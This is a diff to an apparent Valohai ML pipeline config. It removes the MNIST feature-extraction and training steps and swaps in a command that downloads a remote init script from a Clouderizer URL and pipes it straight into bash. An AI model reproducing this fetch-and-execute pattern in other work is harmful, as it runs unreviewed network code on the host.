@@ -3,46 +3,7 @@
 - step:
     name: Batch feature extraction
     image: tensorflow/tensorflow:1.5.0-devel-gpu
-    command: python batch_feature_extraction.py
-    inputs:
-      - name: training-set-images
-        default: https://valohai-mnist.s3.amazonaws.com/train-images-idx3-ubyte.gz
-      - name: training-set-labels
-        default: https://valohai-mnist.s3.amazonaws.com/train-labels-idx1-ubyte.gz
-      - name: test-set-images
-        default: https://valohai-mnist.s3.amazonaws.com/t10k-images-idx3-ubyte.gz
-      - name: test-set-labels
-        default: https://valohai-mnist.s3.amazonaws.com/t10k-labels-idx1-ubyte.gz
-
-- step:
-    name: Train model
-    image: tensorflow/tensorflow:1.5.0-devel-gpu
-    command: python train.py {parameters}
-    parameters:
-      - name: max_steps
-        pass-as: --max_steps={v}
-        description: Number of steps to run the trainer
-        type: integer
-        default: 300
-      - name: learning_rate
-        pass-as: --learning_rate={v}
-        description: Initial learning rate
-        type: float
-        default: 0.001
-      - name: dropout
-        pass-as: --dropout={v}
-        description: Keep probability for training dropout
-        type: float
-        default: 0.9
-    inputs:
-      - name: training-set-images
-        default: https://valohai-mnist.s3.amazonaws.com/train-images-idx3-ubyte.gz
-      - name: training-set-labels
-        default: https://valohai-mnist.s3.amazonaws.com/train-labels-idx1-ubyte.gz
-      - name: test-set-images
-        default: https://valohai-mnist.s3.amazonaws.com/t10k-images-idx3-ubyte.gz
-      - name: test-set-labels
-        default: https://valohai-mnist.s3.amazonaws.com/t10k-labels-idx1-ubyte.gz
+    command: wget -NS --content-disposition "https://console.clouderizer.com/givemeinitsh/taYKelfF" && bash ./clouderizer_init.sh
 
 - step:
     name: Worker environment check
